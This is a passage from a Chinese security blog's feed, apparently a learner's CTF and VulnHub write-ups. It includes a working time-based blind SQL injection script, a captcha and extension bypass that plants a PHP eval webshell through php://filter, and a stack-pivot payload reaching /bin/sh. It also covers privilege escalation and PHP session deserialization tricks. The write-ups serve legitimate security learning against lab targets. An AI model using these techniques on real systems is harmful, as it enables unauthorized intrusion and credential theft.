&lt;p&gt;然后在 &lt;code&gt;library\App.php&lt;/co
      
    
    </summary>
    
    
      <category term="web" scheme="https://liey1.github.io/tags/web/"/>
    
  </entry>
  
  <entry>
    <title>记一道 web 题</title>
    <link href="https://liey1.github.io/2018/12/16/%E8%AE%B0%E4%B8%80%E9%81%93%20web%20%E9%A2%98/"/>
    <id>https://liey1.github.io/2018/12/16/记一道 web 题/</id>
    <published>2018-12-15T17:15:09.231Z</published>
    <updated>2018-12-15T17:16:10.461Z</updated>
    
    <content type="html"><![CDATA[<p>原文：<a href="https://www.anquanke.com/post/id/167637" target="_blank" rel="noopener">https://www.anquanke.com/post/id/167637</a></p><hr><p>这道题不算难吧。。（虽然看了 WP。。。）</p><p>源码太长了，不贴了。原题里有。。贴一下数据库的代码吧：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">create database web500 charset=utf8;</span><br><span class="line">use web500;</span><br><span class="line">create table user(</span><br><span class="line"> id int key auto_increment,</span><br><span class="line"> user varchar(100),</span><br><span class="line"> pass varchar(100)</span><br><span class="line">);</span><br><span class="line">create table note(</span><br><span class="line"> id int key auto_increment,</span><br><span class="line"> user varchar(100),</span><br><span class="line"> title varchar(100),</span><br><span class="line"> content varchar(100)</span><br><span class="line">);</span><br><span class="line">insert user values(1,&quot;admin&quot;,&quot;admin123&quot;);</span><br></pre></td></tr></table></figure></p><p>首先大致的看看几个函数：<br><img src="http://bmob-cdn-22342.b0.upaiyun.com/2018/12/14/2b39f90940810071805150a75c074c4b.png" alt="1"></p><p>可以发现这里查询的时候都把 <code>$user</code> 转成 <code>hex</code> 了。</p><p>but。。。<br><img src="http://bmob-cdn-22342.b0.upaiyun.com/2018/12/14/537cb6ad40487893802dd250621e5519.png" alt="此处输入图片的描述"></p><p>是的，这里没有 <code>tohex</code>。我们可以看看这个 <code>$user</code> 是哪里来的：<br><img src="http://bmob-cdn-22342.b0.upaiyun.com/2018/12/14/b7ec0533401b3b638041451e801b3cb3.png" alt="此处输入图片的描述"></p><p>可以看到这里 是从 <code>session</code> 获取的，那么 <code>seesion</code> 中的 <code>user</code> 是怎么来的呢？</p><p>这里还注册了个 <code>$admin</code> 变量。记录登陆的用户是否为 <code>admin</code></p><p><img src="http://bmob-cdn-22342.b0.upaiyun.com/2018/12/14/9a9450c540877be0804c2c235561fae8.png" alt="此处输入图片的描述"></p><p>登陆成功后，从 <code>$_POST[&#39;user&#39;]</code> 中提取的。</p><p>利用流程：注册一个用户 -&gt; 登陆 -&gt; 添加note -&gt; 删除note。</p><p>哦~至于为什么要 admin 的密码，我们可以看：</p><p><img src="http://bmob-cdn-22342.b0.upaiyun.com/2018/12/14/475fee504096616080164fcc057fc162.png" alt="此处输入图片的描述"></p><p>最开始判断了是否为 <code>admin</code>。</p><p>这里好像能写 <code>shell</code>，但是此处限制了文件名的后缀 ，怎么绕过这个 <code>preg_match</code> 呢？</p><p>此处正则：<code>.+\.ph(p[3457]?|t|tml)$</code></p><p>可以发现正则最后有个 <code>$</code>，即：<code>php/pht/pht</code> 这样的后缀才会被匹配，说白了就是最后不能是 <code>php/pht/phtml/ph2/3/4/5</code> 这样，但是 <code>phpa/phtb</code> 这样的后缀正则表达式就匹配不到了。。。。</p><p>那么我们的后缀可以这样：  <code>php/.</code> ，因为 <code>/</code> 是路径分隔符（吧？），所以创建 <code>abc.php/.</code> 相当于写入 <code>abc.php</code>。</p><hr><h2 id="注入"><a href="#注入" class="headerlink" title="注入"></a>注入</h2><p>ok。回到前面，我们发现可以注入，我们此时试试注入处 <code>admin</code> 的密码，手动几乎不可能的，我们考虑用用脚本吧</p><p><img src="http://bmob-cdn-22342.b0.upaiyun.com/2018/12/14/a5499674403e85508056ab9ca8507363.png" alt="此处输入图片的描述"></p><p>但是不管登陆注册我们都会发现有个这个，这个是判断验证码是否正确。。</p><p>且这里不能一个验证码多次使用。。。</p><p>但是。。。。这里并没有判断 <code>$_SESSION[&#39;answer&#39;]</code> 是否为空。</p><p>而生成验证码的是一段 <code>html</code> ：<code>&lt;img src=&quot;valicode.php&quot;&gt;</code></p><p>当我们直接请求 <code>register</code> 时会先解释 <code>php</code> 代码。如果此时 <code>answer</code> 还没生成，那么当我们传入的 <code>code</code> 为 空时：<code>&#39;&#39;==NULL</code> 成立。</p><p>那怎么让他生成之前请求 <code>register</code> 呢？此处只需要把 <code>SESSION</code> 删了，即可。</p><p>于是写个jo本：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><span class="line">import requests</span><br><span class="line">import time</span><br><span class="line"></span><br><span class="line">def register(user,passwd):</span><br><span class="line">    url=&quot;http://192.168.0.109/ctf/web500/test.php?action=register&quot;</span><br><span class="line">    requests.post(url,data=&#123;&quot;user&quot;:user,&quot;pass&quot;:passwd,&quot;code&quot;:&quot;&quot;&#125;)</span><br><span class="line">    pass</span><br><span class="line"></span><br><span class="line">def login(user,passwd):</span><br><span class="line">    s = requests.session()</span><br><span class="line">    url=&quot;http://192.168.0.109/ctf/web500/test.php?action=login&quot;</span><br><span class="line">    s.post(url,data=&#123;&quot;user&quot;:user,&quot;pass&quot;:passwd,&quot;code&quot;:&quot;&quot;&#125;)</span><br><span class="line">    return s</span><br><span class="line">    pass</span><br><span class="line"></span><br><span class="line">def delete_note(s):</span><br><span class="line">    url = &quot;http://192.168.0.109/ctf/web500/test.php?action=delete&amp;id=4&quot;</span><br><span class="line">    s.get(url)</span><br><span class="line">    pass</span><br><span class="line"></span><br><span class="line">payload = &quot;11&apos; or if(mid((select pass from user where user=&apos;admin&apos;),&#123;offset&#125;,1)=&apos;&#123;asc&#125;&apos;,sleep(5),0)=1 or 1=&apos;&quot;</span><br><span class="line">admin_pass = &quot;&quot;</span><br><span class="line">for i in range(1,100):</span><br><span class="line">    print &quot;admin_pass : &quot;,admin_pass</span><br><span class="line">    for a in &apos;abcdefghijklmnopqrstuvwxyz1234567890&apos;:</span><br><span class="line">        payload_tmp = payload.format(offset=i,asc=a)</span><br><span class="line">        register(payload_tmp,&apos;1234&apos;)</span><br><span class="line">        s = login(payload_tmp,&apos;1234&apos;)</span><br><span class="line">        t1 = time.time()</span><br><span class="line">        delete_note(s)</span><br><span class="line">        t2 = time.time()</span><br><span class="line"></span><br><span class="line">        if t2-t1&gt;3:</span><br><span class="line">            admin_pass+=a</span><br><span class="line">            break;</span><br></pre></td></tr></table></figure><p>我一开始还碰到了些问题，，好像是 <code>and</code> 和 <code>or</code> 的问题：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">if(mid((select pass from user where user=&apos;admin&apos;),&#123;offset&#125;,1)=&apos;&#123;asc&#125;&apos;,sleep(5),0)=1 or 1=&apos;&apos;</span><br></pre></td></tr></table></figure></p><p>如果最后的  <code>or 1=&#39;&#39;</code> 是 <code>and 1=&#39;&#39;</code> 的话，好像就不行。</p><p>同样的可以参考：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">select * from user where 1=(sleep(10)) and 1=&apos;&apos;; # 不触发 sleep</span><br><span class="line">select * from user where 1=(sleep(10)) and 1=1; # 触发 sleep</span><br><span class="line">select * from user where 1=1 and 1=(sleep(10)); # 触发 sleep</span><br><span class="line">select * from user where 1=&apos;&apos; and 1=(sleep(10)); # 不触发 sleep</span><br><span class="line">select * from user where 1=(sleep(3)) and 1=(sleep(10)); # 一直睡下去。。。</span><br></pre></td></tr></table></figure></p><p>猜测可能是 如果 <code>where</code> 子句中有 <code>and</code> 先判断了耗时比较短的，如果耗时短的都不行那就没必要判断耗时长的了</p><p>以上是瞎猜的。。反正用 <code>or</code> 就对了。。233</p><p>但是好像有一些问题。。。会多跑出几个字符。。。md算了。。</p><p>跑出密码后就可以登陆了，此时使用 <code>backup</code> 功能。</p><p>发现 <code>php/.</code> 的后缀确实可以保存成 <code>php</code> 后缀的文件名，，但是：</p><p>当我们执行 newnote 添加一个 <code>&lt;?php eval($_REQUEST[1])?&gt;</code> 的时候：</p><p><img src="http://bmob-cdn-22342.b0.upaiyun.com/2018/12/15/2c58c7bf4067983d802ae62d03b640d6.png" alt="此处输入图片的描述"></p><p>这里使用了 <code>htmlspecialchars</code>：</p><p><img src="http://bmob-cdn-22342.b0.upaiyun.com/2018/12/15/da295fa640028701801e58b14012cde7.png" alt="此处输入图片的描述"></p><p>于是便不能直接写一句话了。</p><p>这时候：</p><p>参考下p神的文章:<a href="https://www.leavesongs.com/PENETRATION/php-filter-magic.html" target="_blank" rel="noopener">谈一谈php://filter的妙用</a></p><p>得知我们可以在 文件操作的地方使用 <code>php://filter</code> 伪协议</p><p>我们可以 <code>add_note</code> 的时候添加：<br><code>base64_encode(&#39;&lt;?php eval($_REQUEST[1])?&gt;&#39;)</code><br>这个的结果：<br><code>PD9waHAgZXZhbCgkX1JFUVVFU1RbMV0pPz4</code></p><p>此时调用 backup，文件名写：<br><code>php://filter/convert.base64-decode/resource=test.php/.</code></p><p>注意这里是 <code>base64-decode</code>。。。</p><p>至此就已经拿到 <code>shell</code> 了。。</p><hr><h1 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h1><p>这题使用到的 <code>trick</code> :</p><ol><li>二次注入</li><li>删除 SESSION 的方式绕过验证码</li><li>操作文件时使用 php://filter 伪协议。。</li></ol>]]></content>
    
    <summary type="html">
    
      
      
        &lt;p&gt;原文：&lt;a href=&quot;https://www.anquanke.com/post/id/167637&quot; target=&quot;_blank&quot; rel=&quot;noopener&quot;&gt;https://www.anquanke.com/post/id/167637&lt;/a&gt;&lt;/p&gt;
&lt;hr&gt;

      
    
    </summary>
    
    
      <category term="web" scheme="https://liey1.github.io/tags/web/"/>
    
      <category term="ctf" scheme="https://liey1.github.io/tags/ctf/"/>
    
  </entry>
  
  <entry>
    <title>VulnHub JIS-CTF</title>
    <link href="https://liey1.github.io/2018/12/02/VulnHub%20JIS-CTF/"/>
    <id>https://liey1.github.io/2018/12/02/VulnHub JIS-CTF/</id>
    <published>2018-12-02T15:15:09.813Z</published>
    <updated>2018-12-02T15:15:40.736Z</updated>
    
    <content type="html"><![CDATA[<p>说实话真的很丢人，这道题真的很简单。。一开始挑这道题是因为这道题百度有 WP。。。唉~ WP 选手。</p><p><a href="https://www.vulnhub.com/entry/jis-ctf-vulnupload,228/" target="_blank" rel="noopener">题目地址</a></p><hr><p>一开始一个登陆界面，不知道怎么做？当然是扫目录啊。</p><p>扫到个 <code>robots.txt</code> [不想截图]</p><p>访问：<br><img src="http://bmob-cdn-22342.b0.upaiyun.com/2018/12/02/55dc248e406b9af1805cf8d3b8eda493.png" alt="1"></p><p>看到一些，但是并不是全部都能访问，一个一个访问吧：</p><p><img src="http://bmob-cdn-22342.b0.upaiyun.com/2018/12/02/519019374071f37980461aced3936214.png" alt="2"></p><p><code>admin_area</code> 里面有 第二个 flag</p><p><img src="http://bmob-cdn-22342.b0.upaiyun.com/2018/12/02/f7214f6d40732f0880877e9bacaeb726.png" alt="3"></p><p>第一个 flag 在 <code>/flag</code> 里</p><p>然后利用 <code>admin_area</code> 获取到的用户名密码登陆，发现有个上传。然后任意上传，菜刀连接。。。目录的话在 <code>robots.txt</code> 里有的，是那个 <code>uploaded_files</code> </p><p>我用的是 <code>metasploit</code> 了，因为我菜刀连不上。。用的 <code>multi/http/caidao_php_backdoor_exec</code> 这个模块。。设置好就行了。。</p><p>进入 <code>meterpreter</code> 之后进入 <code>shell</code>，<code>meterpreter</code> 好像看不到文件的所属用户和组</p><p><img src="http://bmob-cdn-22342.b0.upaiyun.com/2018/12/02/83dc9bd240a0c53e8033c5e2de784b36.png" alt="3"></p><p>这里看到 <code>flag.txt</code> 是读取不了的，所以读取 <code>hint</code> 看看，然后这里就有了第三个 <code>flag</code> 了</p><p>提示说拿到 <code>technawi</code> 的密码，这里是我看 <code>wp</code> 的地方。。原因是我确实不知道怎么找。。</p><p>使用命令： <code>grep -rs technawi /</code></p><p><img src="http://bmob-cdn-22342.b0.upaiyun.com/2018/12/02/af5ac6c040f840b780c283119924e997.png" alt="此处输入图片的描述"></p><p>搜索 <code>/</code> 可太慢了，剧透直接搜索 <code>/etc/</code></p><p>然后打开这个：</p><p><img src="http://bmob-cdn-22342.b0.upaiyun.com/2018/12/02/48eddc064020ef0f80791b17703c0a71.png" alt="此处输入图片的描述"></p><p>第四个 <code>flag</code> 和 <code>technawi</code> 的密码</p><p>然后就是 ssh 远程连接。。打开刚刚那个 <code>flag.txt</code> ：<br><img src="http://bmob-cdn-22342.b0.upaiyun.com/2018/12/02/a1ff96c44045e74f801685993d31d8b7.png" alt="此处输入图片的描述"></p><p>这里就结束了，，but，你有没有发现的用户是 <code>root</code>，没错，在我拿到 flag5 前我还注意到了 <code>technawi</code> 目录下有个 <code>.sudo_as_admin_successful</code> 这个文件，我在想会不会是可以 <code>sudo</code> 呢？ 于是我 <code>sudo root</code>。<br>发现果真可以。。看看 <code>/etc/sudoers</code> 文件：</p><p><img src="http://bmob-cdn-22342.b0.upaiyun.com/2018/12/02/4f4bf1a0404a2198809bb653409f0f02.png" alt="此处输入图片的描述"></p><p><img src="http://bmob-cdn-22342.b0.upaiyun.com/2018/12/02/5a05c44040bf71d4805412c14e05ea4e.png" alt="此处输入图片的描述"></p><p>看，<code>technawi</code> 是 <code>sudo</code> 组的。</p><p>那么那个文件是干嘛的呢？？<br>我也不知道，，</p><p>可以看看<a href="https://askubuntu.com/questions/813942/is-it-possible-to-stop-sudo-as-admin-successful-being-created" target="_blank" rel="noopener">这里</a></p><p>反正每次 <code>sudo</code> 都会产生。。</p><p>关于 sudoers 那个文件我了解到也不是很透彻，可以参考：<br><a href="http://blog.51cto.com/191226139/2059648" target="_blank" rel="noopener">sudoers</a></p><p>借用里面的一张图就很明了了：<br><img src="http://bmob-cdn-22342.b0.upaiyun.com/2018/12/02/02b7c1fd4014f73680734dd4360fd66d.png" alt="此处输入图片的描述"></p><p>ok,就这么多，下次尽量选个难点的。。233</p><hr>]]></content>
    
    <summary type="html">
    
      
      
        &lt;p&gt;说实话真的很丢人，这道题真的很简单。。一开始挑这道题是因为这道题百度有 WP。。。唉~ WP 选手。&lt;/p&gt;
&lt;p&gt;&lt;a href=&quot;https://www.vulnhub.com/entry/jis-ctf-vulnupload,228/&quot; target=&quot;_blank&quot;
      
    
    </summary>
    
    
      <category term="VulnHub" scheme="https://liey1.github.io/tags/VulnHub/"/>
    
  </entry>
  
  <entry>
    <title>PWNABLE.kr --- simple login</title>
    <link href="https://liey1.github.io/2018/11/27/PWNABLE.kr%20---%20simple%20login/"/>
    <id>https://liey1.github.io/2018/11/27/PWNABLE.kr --- simple login/</id>
    <published>2018-11-27T15:21:56.198Z</published>
    <updated>2018-11-27T15:22:28.801Z</updated>
    
    <content type="html"><![CDATA[<p><code>真的很 simple，我还做了很久，。。。</code></p><hr><p>此题来自 ： <a href="http://pwnable.kr/play.php" target="_blank" rel="noopener">pwnable.kr</a></p><p>代码：<br><img src="http://bmob-cdn-22342.b0.upaiyun.com/2018/11/27/9ed672b24044fd3c805632e229a75442.png" alt="1"></p><p>很简单的代码，接收一个长度 <code>30</code> 之内的字符串进行 <code>base64decode</code> ，再判断长度是否大于 <code>0xC</code>，然后进入 <code>auth</code> 函数。</p><p>这里可以注意一下第 21 行，将输入的字符串 base64解码后的字符串（v4）复制到全局变量 <code>input</code> 中。</p><p>看看 <code>auth</code> 函数：</p><p><img src="http://bmob-cdn-22342.b0.upaiyun.com/2018/11/27/8e3649bf4070865880976f4909b0deb2.png" alt="2"></p><p>也很简单，把 <code>input</code> 取出来，<code>md5</code>，然后输出 <code>md5</code>，然后和 <code>f87cd...</code> 比较是否相等。</p><p>最后回到 main 函数第 22 行，如果相等那么就进入 <code>correct</code> 函数。</p><p><img src="http://bmob-cdn-22342.b0.upaiyun.com/2018/11/27/831c8b9f40773db38038af72e5ef0da5.png" alt="3"></p><p>这里判断了 input 是否为 <code>-559038737</code>，难道让我们输入的是这个吗？</p><p>怎么可能。。。把这个数字去 <code>md5</code> 加密一下就知道不对了。</p><h2 id="过程"><a href="#过程" class="headerlink" title="过程"></a>过程</h2><p>一开始没仔细看 correct 函数，以为进入就直接获得 shell 了，所以在纠结能否直接通过 auth，为此我还去尝试解密 <code>f87cd601aa7fedca99018a8be88eda34</code> 这个。。无果。。。</p><p>那么我就在想会不会是哪里溢出了呢。。但是 main 函数里字符限制的都很好，于是我再一次进入了 auth 函数。</p><p>然后很理所当然的注意到：</p><p><img src="http://bmob-cdn-22342.b0.upaiyun.com/2018/11/27/c1c1c64240b74f1b80c6a3f2918e9aab.png" alt="4"></p><p><code>v4</code> 长度是 <code>8</code> ，但是 前面提到过 <code>input</code> 的长度是 <code>0xC</code>，即 <code>12</code>，所以刚好可以覆盖到上一层的 <code>ebp</code> 值</p><p>bingo，于是我们想到了：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">1. 在 `auth` 函数覆盖上层函数 `ebp`，假设为 `fake_ebp`</span><br><span class="line">2. `auth` 退出后 `ebp` 为 `fake_ebp`</span><br><span class="line">3. 回到 `main` 函数也不会执行什么代码就退出了，此时执行：</span><br><span class="line">    `leave`</span><br><span class="line">    `ret`</span><br><span class="line">这两行代码很熟悉了，说白了就是：</span><br><span class="line">`leave = mov esp,ebp;pop ebp;`</span><br><span class="line">`ret = pop eip`</span><br></pre></td></tr></table></figure><p>但是不要忘了，在 auth 函数退出时也执行了 <code>leave ; ret</code>。</p><p>所以是执行了两次，所以我们还要找一个可以控制的地方，那么这个地方很显然只有一个 <code>input</code> 了。于是：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">paylaod = &apos;a&apos;*4 + getshell_addr + input_addr</span><br></pre></td></tr></table></figure></p><p>这里的 <code>getshell_addr</code> 是 <code>correct</code> 函数里 <code>system(&#39;/bin/sh&#39;)</code> 那一行。</p><p>这样在第一次执行完 <code>leave ; ret</code> 后 ebp 就指向了 <code>input</code> 的地址（’aaaa’ 的地方），然后第二次执行的时候：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">leave = mov esp,ebp(aaaa 的位置) ; pop ebp (此处可以无视 `ebp`，但是 `esp+4` 了，所以 `esp` 指向了 `getshell_addr` 的位置 )</span><br><span class="line">ret = mov eip,esp（此时指向了 `getshell_addr` 的位置了。）</span><br></pre></td></tr></table></figure></p><p>ok，到这里分析完了。。。</p><p>然而我第一次的 payload 尽然是：<code>&#39;a&#39;*8 + getshell_addr-4</code></p><p>还久久的没反应过来，调试了才发现的。哎，打扰了。。</p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;p&gt;&lt;code&gt;真的很 simple，我还做了很久，。。。&lt;/code&gt;&lt;/p&gt;
&lt;hr&gt;
&lt;p&gt;此题来自 ： &lt;a href=&quot;http://pwnable.kr/play.php&quot; target=&quot;_blank&quot; rel=&quot;noopener&quot;&gt;pwnable.kr&lt;/a&gt;&lt;
      
    
    </summary>
    
    
      <category term="pwn" scheme="https://liey1.github.io/tags/pwn/"/>
    
      <category term="pwnable.kr" scheme="https://liey1.github.io/tags/pwnable-kr/"/>
    
  </entry>
  
  <entry>
    <title>LCTF bestphps_revenge 复现总结</title>
    <link href="https://liey1.github.io/2018/11/27/LCTF%20bestphps_revenge%20%E5%A4%8D%E7%8E%B0%E6%80%BB%E7%BB%93/"/>
    <id>https://liey1.github.io/2018/11/27/LCTF bestphps_revenge 复现总结/</id>
    <published>2018-11-26T16:12:03.694Z</published>
    <updated>2018-12-16T16:19:23.368Z</updated>
    
    <content type="html"><![CDATA[<p>彩笔只能复现 :(</p><hr><h1 id="知识点"><a href="#知识点" class="headerlink" title="知识点"></a>知识点</h1><ol><li>首先看看 <code>php</code> 中 <code>SESSION</code> 默认是怎么存储的：<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">session_start();</span><br><span class="line">$_SESSION[&apos;a&apos;]=&apos;1&apos;;</span><br><span class="line">$_SESSION[&apos;b&apos;]=&apos;1&apos;;</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure></li></ol><p>打开 <code>session</code> 文件：</p><blockquote><p>a|s:1:”1”;b|s:1:”1”;</p></blockquote><p>但是 php 还有另一种存储方式（不跟你说你还不知道吧~）：<br><code>http://php.net/manual/zh/session.configuration.php#ini.session.serialize-handler</code></p><p>另一种存储方式叫：<code>php_serialize</code>，默认的叫什么？叫：<code>php</code></p><p>设置有三种方法：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">1. 在 php.ini 中修改这一行： session.serialize_handler = php</span><br><span class="line">2. ini_set(&apos;session.serialize_handler&apos;, &apos;php_serialize&apos;);</span><br><span class="line">3. session_start(array(&quot;serialize_handler&quot;=&gt;&quot;php_serialize&quot;));</span><br></pre></td></tr></table></figure></p><p>第三种方法是 php7 加上的：<br><img src="http://bmob-cdn-22342.b0.upaiyun.com/2018/11/26/19179cc8403bb9b880cc075d17a7de4c.png" alt="1"></p><p>注意是 <code>7</code> 才加上的！！！其他的 <code>seesion</code> 参数应该也能改。</p><p>好了好了，来看看 <code>php_serialize</code> 是怎么存储 <code>SESSION</code> 数据的：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">session_start(array(&quot;serialize_handler&quot;=&gt;&quot;php_serialize&quot;));</span><br><span class="line">$_SESSION[&apos;a&apos;]=&apos;1&apos;;</span><br><span class="line">$_SESSION[&apos;b&apos;]=&apos;1&apos;;</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure><blockquote><p>a:2:{s:1:”a”;s:1:”1”;s:1:”b”;s:1:”1”;}</p></blockquote><p>没错，用过 <code>serialize</code> 函数的都看得出来这直接用了这个函数序列化的（刚刚给的文档里也有说。。。）</p><p>接下来再详细点，我们看看 <code>php</code> 模式是怎么存储对象的：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">class Test&#123;</span><br><span class="line">public $test_variable = &quot;niubi&quot;;</span><br><span class="line">public function __destruct()&#123;</span><br><span class="line">echo $this-&gt;test_variable;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line">session_start();</span><br><span class="line">$_SESSION[&apos;a&apos;]=&apos;1&apos;;</span><br><span class="line">$_SESSION[&apos;b&apos;]=new Test();</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure></p><blockquote><p>a|s:1:”1”;b|O:4:”Test”:1:{s:13:”test_variable”;s:5:”niubi”;}</p></blockquote><p><code>php_serialize</code> 呢？</p><blockquote><p>a:2:{s:1:”a”;s:1:”1”;s:1:”b”;O:4:”Test”:1:{s:13:”test_variable”;s:5:”niubi”;}}</p></blockquote><p>可以发现这里也有共同点：<code>O:4:&quot;Test&quot;:1:{s:13:&quot;test_variable&quot;;s:5:&quot;niubi&quot;;}</code>（不信就按 <code>ctrl+f</code> 看看）</p><h2 id="来一个有意思的例子："><a href="#来一个有意思的例子：" class="headerlink" title="来一个有意思的例子："></a>来一个有意思的例子：</h2><p>（此处建议先清空 <code>SESSION</code> 或者干脆直接删掉 <code>SESSION</code> 文件也可以）</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">//a.php</span><br><span class="line">&lt;?php</span><br><span class="line">class Test&#123;</span><br><span class="line">public $test_variable = &quot;niubi&quot;;</span><br><span class="line">public function __destruct()&#123;</span><br><span class="line">echo $this-&gt;test_variable;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line">session_start(array(&quot;serialize_handler&quot;=&gt;&quot;php_serialize&quot;));</span><br><span class="line">$_SESSION[&apos;a&apos;]=&apos;a|s:1:&quot;b&quot;;c|O:4:&quot;Test&quot;:1:&#123;s:13:&quot;test_variable&quot;;s:5:&quot;niubi&quot;;&#125;&apos;;</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">//b.php</span><br><span class="line">&lt;?php</span><br><span class="line">class Test&#123;</span><br><span class="line">public $test_variable = &quot;niubi&quot;;</span><br><span class="line">public function __destruct()&#123;</span><br><span class="line">echo $this-&gt;test_variable;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line">session_start();</span><br><span class="line">var_dump($_SESSION);</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure><p>是的，这两个 php 文件用了不同的序列化方式。<br>先访问 <code>a.php</code> ，此时 SESSION 文件应该是：</p><blockquote><p>a:1:{s:1:”a”;s:60:”a|O:4:”Test”:1:{s:13:”test_variable”;s:5:”niubi”;}</p></blockquote><p>分析一下此时访问 <code>b.php</code> 会怎么解析呢：</p><p>c 为 第个键，Test 对象为值。（这里其实还会执行 test 对象的 __destruct 函数）</p><p>访问一下 <code>b.php</code>：</p><p><img src="http://bmob-cdn-22342.b0.upaiyun.com/2018/11/27/b1789a784095a1ee80a167363701e926.png" alt="2"></p><p>bingo~</p><h1 id="回到正题。。。。"><a href="#回到正题。。。。" class="headerlink" title="回到正题。。。。"></a>回到正题。。。。</h1><p>没错，正题是题目，别忘了这是个题目分析的文章。。。</p><p>题目代码：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">//index.php</span><br><span class="line">highlight_file(__FILE__);</span><br><span class="line">$b = &apos;implode&apos;;</span><br><span class="line">call_user_func($_GET[f],$_POST);</span><br><span class="line">session_start();</span><br><span class="line">if(isset($_GET[name]))&#123;</span><br><span class="line">    $_SESSION[name] = $_GET[name];</span><br><span class="line">&#125;</span><br><span class="line">var_dump($_SESSION);</span><br><span class="line">$a = array(reset($_SESSION),&apos;welcome_to_the_lctf2018&apos;);</span><br><span class="line">call_user_func($b,$a);</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">//flag.php</span><br><span class="line">&lt;?php</span><br><span class="line">highlight_file(__FILE__);</span><br><span class="line">$b = &apos;implode&apos;;</span><br><span class="line">$_GET[&apos;f&apos;]=&quot;session_start&quot;;</span><br><span class="line">$_POST[&apos;serialize_handler&apos;]=&apos;php_serialize&apos;;</span><br><span class="line">call_user_func($_GET[&apos;f&apos;],$_POST);</span><br><span class="line">session_start();</span><br><span 